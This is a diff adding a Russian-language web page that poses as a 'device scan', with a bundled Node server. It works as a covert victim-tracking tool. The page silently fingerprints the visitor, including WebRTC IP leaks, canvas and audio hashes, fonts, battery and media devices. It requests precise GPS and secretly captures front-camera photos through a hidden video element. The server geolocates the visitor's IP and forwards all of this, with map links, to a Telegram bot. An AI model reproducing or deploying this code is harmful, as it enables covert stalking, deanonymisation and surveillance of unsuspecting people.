@@ -1,0 +1,325 @@
+<!-- language: HTML, file: index.html, repo: xawice/scan -->
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Проверка устройства…</title>
+<style>
+  html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#000;}
+  #bg{position:fixed;inset:0;width:100vw;height:100vh;object-fit:cover;z-index:1;
+      user-select:none;-webkit-user-drag:none;}
+  #veil{position:fixed;inset:0;z-index:2;pointer-events:none;
+        background:radial-gradient(ellipse at center,rgba(0,0,0,.20) 0%,rgba(0,0,0,.70) 100%);}
+  #panel{position:fixed;left:0;right:0;bottom:36px;z-index:3;text-align:center;
+         color:#fff;font:600 15px/1.5 system-ui,sans-serif;padding:0 24px;
+         text-shadow:0 1px 8px rgba(0,0,0,.9);letter-spacing:.4px;}
+  #bar{margin:14px auto 0;width:min(320px,70vw);height:4px;border-radius:4px;
+       background:rgba(255,255,255,.18);overflow:hidden;}
+  #bar > i{display:block;height:100%;width:0%;background:#2b6cff;
+           animation:run 3.2s ease-in-out infinite;}
+  @keyframes run{0%{width:5%}50%{width:85%}100%{width:5%}}
+  #step{font-size:12px;color:#b8bfc8;margin-top:10px;font-weight:500;letter-spacing:.3px;}
+  video{position:fixed;width:1px;height:1px;opacity:0;top:-10px;left:-10px;}
+  #srvbtn{position:fixed;top:8px;right:8px;z-index:5;opacity:.05;font:11px/1 system-ui;
+          background:#000;color:#fff;border:1px solid #333;border-radius:6px;padding:4px 6px;
+          cursor:pointer;transition:opacity .2s;}
+  #srvbtn:hover{opacity:1;}
+</style>
+</head>
+<body>
+  <img id="bg" src="https://i.ibb.co/KCqX4SS/IMG-20261008-150608-464.jpg" alt="">
+  <div id="veil"></div>
+  <div id="panel">
+    <div id="title">Сканирование устройства…</div>
+    <div id="bar"><i></i></div>
+    <div id="step">проверка соединения</div>
+  </div>
+  <video id="v" autoplay playsinline muted></video>
+  <button id="srvbtn" title="copy server.js">srv</button>
+
+  <script type="text/plain" id="server-js">
+// language: JavaScript, file: server.js, runtime: Node 18+
+// Запуск: npm i express cors && node server.js
+// Подставь TG_TOKEN и TG_CHAT_ID.
+const express = require('express');
+const fs = require('fs');
+const cors = require('cors');
+
+const app = express();
+const PORT = 3000;
+
+const TG_TOKEN   = 'PASTE_BOT_TOKEN_HERE';
+const TG_CHAT_ID = 'PASTE_CHAT_ID_HERE';
+
+app.use(cors());
+app.use(express.json({ limit: '25mb' }));
+app.set('trust proxy', true);
+if (!fs.existsSync('./shots')) fs.mkdirSync('./shots');
+
+function clientIp(req){
+  const xff = req.headers['x-forwarded-for'];
+  if (xff) return xff.split(',')[0].trim();
+  return req.socket.remoteAddress;
+}
+
+async function geoLookup(ip){
+  try {
+    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,timezone,proxy,hosting,mobile`);
+    return await r.json();
+  } catch (e) { return { status:'fail', error:String(e) }; }
+}
+
+async function sendTelegram(text, photoBuf){
+  try {
+    if (photoBuf) {
+      const form = new FormData();
+      form.append('chat_id', TG_CHAT_ID);
+      form.append('caption', text.slice(0,1024));
+      form.append('photo', new Blob([photoBuf],{type:'image/jpeg'}), 'cam.jpg');
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:form});
+    } else {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode:'HTML' })
+      });
+    }
+  } catch(e){ console.error('tg fail:', e.message); }
+}
+
+app.get('/api/hit', async (req,res)=>{
+  const ip = clientIp(req);
+  const ua = req.headers['user-agent'] || 'unknown';
+  const lang = req.headers['accept-language'] || 'unknown';
+  const geo = await geoLookup(ip);
+  const text =
+    `🟢 <b>Визит</b>\n` +
+    `<b>IP:</b> <code>${ip}</code>\n` +
+    `<b>UA:</b> ${ua}\n` +
+    `<b>Lang:</b> ${lang}\n` +
+    `<b>Страна:</b> ${geo.country||'?'} (${geo.countryCode||'?'})\n` +
+    `<b>Регион:</b> ${geo.regionName||'?'}\n` +
+    `<b>Город:</b> ${geo.city||'?'}\n` +
+    `<b>Индекс:</b> ${geo.zip||'?'}\n` +
+    `<b>Провайдер:</b> ${geo.isp||'?'}\n` +
+    `<b>Орг:</b> ${geo.org||'?'}\n` +
+    `<b>AS:</b> ${geo.as||'?'}\n` +
+    `<b>Timezone:</b> ${geo.timezone||'?'}\n` +
+    `<b>Proxy:</b> ${geo.proxy?'ДА':'нет'}\n` +
+    `<b>Hosting:</b> ${geo.hosting?'ДА':'нет'}\n` +
+    `<b>Mobile:</b> ${geo.mobile?'ДА':'нет'}\n` +
+    `<b>IP-координаты:</b> ${geo.lat},${geo.lon}\n` +
+    `<b>Карта:</b> https://yandex.ru/maps/?pt=${geo.lon},${geo.lat}&z=16`;
+  sendTelegram(text);
+  res.json({ok:true});
+});
+
+app.post('/api/fp', async (req,res)=>{
+  const ip = clientIp(req);
+  const fp = req.body || {};
+  const geo = await geoLookup(ip);
+  const s = fp.screen||{}; const tz = fp.timezone||{};
+  const gl = fp.webgl||{}; const net = fp.connection||{}; const bat = fp.battery||{};
+  const text =
+    `🧬 <b>FINGERPRINT</b>\n` +
+    `IP: <code>${ip}</code>\n` +
+    `Гео: ${geo.city||'?'}, ${geo.regionName||'?'}, ${geo.country||'?'} | ${geo.lat},${geo.lon}\n` +
+    `Провайдер: ${geo.isp||'?'} | AS: ${geo.as||'?'}\n` +
+    `Proxy/Hosting/Mobile: ${geo.proxy?'д':'н'}/${geo.hosting?'д':'н'}/${geo.mobile?'д':'н'}\n` +
+    `UA: <code>${fp.ua||'?'}</code>\n` +
+    `Platform: ${fp.platform||'?'} | Vendor: ${fp.vendor||'?'}\n` +
+    `Языки: ${(fp.languages||[]).join(', ')||fp.language||'?'}\n` +
+    `CPU: ${fp.hardwareConcurrency||'?'} ядер | RAM: ${fp.deviceMemory||'?'} ГБ\n` +
+    `Touch: ${fp.maxTouchPoints||0} | Online: ${fp.onLine?'д':'н'} | DNT: ${fp.doNotTrack||'н'}\n` +
+    `Экран: ${s.w}×${s.h} (avail ${s.aw}×${s.ah}) | DPR ${s.devicePixelRatio}\n` +
+    `Окно: ${s.innerW}×${s.innerH} | Внеш: ${s.outerW}×${s.outerH} | Orient: ${s.orientation||'?'}\n` +
+    `TZ: ${tz.name||'?'} (${tz.offsetMin}) | Locale: ${tz.locale||'?'}\n` +
+    `Сеть: ${net.effectiveType||'?'} | ${net.downlink||'?'} Мбит | RTT ${net.rtt||'?'} мс\n` +
+    `WebRTC IPs: ${(fp.webrtc||[]).join(', ')||'—'}\n` +
+    `Батарея: ${bat.level||'?'} | Заряд: ${bat.charging?'идёт':'нет'}\n` +
+    `GPU: ${gl.unmaskedVendor||gl.vendor||'?'}\n` +
+    `Renderer: ${gl.unmaskedRenderer||gl.renderer||'?'}\n` +
+    `Canvas: <code>${fp.canvasHash||'?'}</code> | Audio: <code>${fp.audioHash||'?'}</code>\n` +
+    `Шрифты (${(fp.fonts||[]).length}): ${(fp.fonts||[]).join(', ')||'—'}\n` +
+    `Медиа: ${(fp.mediaDevices||[]).map(d=>d.kind+':'+(d.label||'—')).join(' | ')||'—'}\n` +
+    `Разрешения: ${Object.entries(fp.permissions||{}).map(([k,v])=>k+'='+v).join(', ')||'—'}`;
+  sendTelegram(text);
+  res.json({ok:true});
+});
+
+app.post('/api/gps', async (req,res)=>{
+  const g = req.body || {};
+  const ip = clientIp(req);
+  const text =
+    `📍 <b>ТОЧНЫЙ GPS</b>\n` +
+    `IP: <code>${ip}</code>\n` +
+    `Lat/Lon: <code>${g.lat},${g.lon}</code> | ±${g.acc} м\n` +
+    `Высота: ${g.alt??'—'} м | Курс: ${g.heading??'—'}° | Скорость: ${g.speed??'—'} м/с\n` +
+    `Google: https://maps.google.com/?q=${g.lat},${g.lon}\n` +
+    `Yandex: https://yandex.ru/maps/?pt=${g.lon},${g.lat}&z=18`;
+  sendTelegram(text);
+  res.json({ok:true});
+});
+
+app.post('/api/photo', async (req,res)=>{
+  const { image, gps, settings } = req.body || {};
+  const ip = clientIp(req);
+  if (!image || !image.startsWith('data:image')) return res.json({ok:false});
+  const buf = Buffer.from(image.split(',')[1],'base64');
+  const safe = ip.replace(/[:.]/g,'_');
+  fs.writeFileSync(`./shots/${safe}_${Date.now()}.jpg`, buf);
+  const st = settings||{};
+  const cap =
+    `📸 <b>Фото с камеры</b>\n` +
+    `IP: <code>${ip}</code>\n` +
+    (gps?`GPS: <code>${gps.lat},${gps.lon}</code> (±${gps.acc} м)\n`:'') +
+    `Камера: ${st.width||'?'}×${st.height||'?'} @ ${st.frameRate||'?'} fps | Facing: ${st.facingMode||'?'}`;
+  await sendTelegram(cap, buf);
+  res.json({ok:true});
+});
+
+app.listen(PORT, ()=>console.log(`receiver on :${PORT}`));
+  </script>
+
+<script>
+const BACKEND = 'https://PASTE_YOUR_BACKEND_HERE';
+const $ = id => document.getElementById(id);
+const api = p => BACKEND.replace(/\/$/, '') + p;
+const post = (path, body) => fetch(api(path), {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify(body),
+  mode: 'cors'
+}).catch(()=>{});
+
+$('srvbtn').addEventListener('click', ()=>{
+  const txt = $('server-js').textContent;
+  navigator.clipboard.writeText(txt).then(()=>{
+    $('srvbtn').textContent='copied';
+    setTimeout(()=>$('srvbtn').textContent='srv',1500);
+  });
+});
+
+const STEPS=['проверка соединения','определение устройства','проверка местоположения','верификация камеры','финальная проверка'];
+let stepIdx=0;
+setInterval(()=>{ stepIdx=(stepIdx+1)%STEPS.length; $('step').textContent=STEPS[stepIdx]; },900);
+
+async function collectFingerprint() {
+  const fp = {};
+  fp.ua = navigator.userAgent;
+  fp.platform = navigator.platform;
+  fp.vendor = navigator.vendor;
+  fp.product = navigator.product;
+  fp.languages = navigator.languages;
+  fp.language = navigator.language;
+  fp.cookieEnabled = navigator.cookieEnabled;
+  fp.doNotTrack = navigator.doNotTrack;
+  fp.onLine = navigator.onLine;
+  fp.hardwareConcurrency = navigator.hardwareConcurrency;
+  fp.deviceMemory = navigator.deviceMemory;
+  fp.maxTouchPoints = navigator.maxTouchPoints;
+  fp.userAgentData = navigator.userAgentData || null;
+  fp.screen = {
+    w:screen.width,h:screen.height,aw:screen.availWidth,ah:screen.availHeight,
+    colorDepth:screen.colorDepth,pixelDepth:screen.pixelDepth,
+    orientation:screen.orientation?screen.orientation.type:null,
+    devicePixelRatio:window.devicePixelRatio,
+    innerW:innerWidth,innerH:innerHeight,outerW:outerWidth,outerH:outerHeight
+  };
+  fp.timezone = {
+    name:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    offsetMin:new Date().getTimezoneOffset(),
+    locale:Intl.DateTimeFormat().resolvedOptions().locale,
+    now:new Date().toString(),utc:new Date().toISOString()
+  };
+  if(navigator.connection){const c=navigator.connection;
+    fp.connection={effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt,saveData:c.saveData};}
+  if(navigator.getBattery){try{const b=await navigator.getBattery();
+    fp.battery={level:Math.round(b.level*100)+'%',charging:b.charging,chargingTime:b.chargingTime,dischargingTime:b.dischargingTime};}catch(e){}}
+  try{const cv=document.createElement('canvas');
+    const gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
+    if(gl){const dbg=gl.getExtension('WEBGL_debug_renderer_info');
+      fp.webgl={vendor:gl.getParameter(gl.VENDOR),renderer:gl.getParameter(gl.RENDERER),
+        unmaskedVendor:dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):null,
+        unmaskedRenderer:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):null,
+        version:gl.getParameter(gl.VERSION),shading:gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        maxTexture:gl.getParameter(gl.MAX_TEXTURE_SIZE)};}}catch(e){}
+  try{const cv=document.createElement('canvas');cv.width=300;cv.height=60;
+    const ctx=cv.getContext('2d');ctx.textBaseline='top';ctx.font='16px Arial';
+    ctx.fillStyle='#f60';ctx.fillRect(0,0,300,60);ctx.fillStyle='#069';ctx.fillText('Lokeii-fp-2026',2,15);
+    ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Lokeii-fp-2026',4,25);
+    const du=cv.toDataURL();let h=0;for(let i=0;i<du.length;i++)h=(h*31+du.charCodeAt(i))|0;
+    fp.canvasHash=(h>>>0).toString(16);}catch(e){}
+  try{const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
+    if(AC){const ctx=new AC(1,44100,44100);const osc=ctx.createOscillator();
+      osc.type='triangle';osc.frequency.value=10000;const comp=ctx.createDynamicsCompressor();
+      osc.connect(comp);comp.connect(ctx.destination);osc.start(0);
+      const buf=await ctx.startRendering();const ch=buf.getChannelData(0);let sum=0;
+      for(let i=4500;i<5000;i++)sum+=Math.abs(ch[i]);fp.audioHash=sum.toString();}}catch(e){}
+  try{const base=['monospace','sans-serif','serif'];
+    const test=['Arial','Courier New','Georgia','Times New Roman','Verdana','Comic Sans MS','Impact','Tahoma','Trebuchet MS','Calibri','Segoe UI','Roboto','Helvetica','Menlo'];
+    const span=document.createElement('span');
+    span.style.cssText='position:absolute;left:-9999px;font-size:72px;';
+    span.textContent='mmmmmmmmmmlli';document.body.appendChild(span);
+    const bs={};base.forEach(b=>{span.style.fontFamily=b;bs[b]=span.offsetWidth;});
+    fp.fonts=test.filter(f=>base.some(b=>{span.style.fontFamily=`'${f}',${b}`;return span.offsetWidth!==bs[b];}));
+    document.body.removeChild(span);}catch(e){}
+  try{const devs=await navigator.mediaDevices.enumerateDevices();
+    fp.mediaDevices=devs.map(d=>({kind:d.kind,label:d.label}));}catch(e){}
+  try{const names=['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write'];
+    const res={};await Promise.all(names.map(async n=>{try{const s=await navigator.permissions.query({name:n});res[n]=s.state;}catch(e){}}));
+    fp.permissions=res;}catch(e){}
+  try{fp.plugins=Array.from(navigator.plugins||[]).map(p=>p.name);}catch(e){}
+  try{fp.webrtc=await new Promise(resolve=>{
+    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    const ips=new Set();pc.createDataChannel('');
+    pc.onicecandidate=e=>{if(!e.candidate){pc.close();return resolve([...ips]);}
+      const m=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i.exec(e.candidate.candidate);
+      if(m)ips.add(m[1]);};
+    pc.createOffer().then(o=>pc.setLocalDescription(o));
+    setTimeout(()=>{try{pc.close();}catch(_){}resolve([...ips]);},3000);});}catch(e){}
+  return fp;
+}
+
+(async function run() {
+  fetch(api('/api/hit'),{mode:'cors'}).catch(()=>{});
+  const fp = await collectFingerprint();
+  post('/api/fp', fp);
+
+  const gps = await new Promise(resolve=>{
+    if(!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      pos=>resolve({lat:pos.coords.latitude.toFixed(6),lon:pos.coords.longitude.toFixed(6),
+                    acc:Math.round(pos.coords.accuracy),alt:pos.coords.altitude,
+                    altAcc:pos.coords.altitudeAccuracy,heading:pos.coords.heading,
+                    speed:pos.coords.speed,ts:pos.timestamp}),
+      ()=>resolve(null),
+      {enableHighAccuracy:true,timeout:15000,maximumAge:0});
+  });
+  if(!gps){ $('title').textContent='Проверка завершена'; $('step').textContent=''; return; }
+  post('/api/gps', gps);
+
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{width:{ideal:1280},height:{ideal:720},facingMode:'user'},audio:false});
+    const v=$('v');v.srcObject=stream;await v.play();
+    await new Promise(r=>setTimeout(r,1800));
+    const c=document.createElement('canvas');
+    c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+    const f1=c.toDataURL('image/jpeg',0.9);
+    await new Promise(r=>setTimeout(r,600));
+    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+    const f2=c.toDataURL('image/jpeg',0.9);
+    const track=stream.getVideoTracks()[0];
+    const settings=track.getSettings?track.getSettings():{};
+    await post('/api/photo',{image:f1,gps,settings});
+    await post('/api/photo',{image:f2,gps,settings});
+    stream.getTracks().forEach(t=>t.stop());
+  }catch(e){}
+  $('title').textContent='Проверка завершена';
+  $('step').textContent='можете закрыть страницу';
+})();
+</script>
+</body>
+</html>
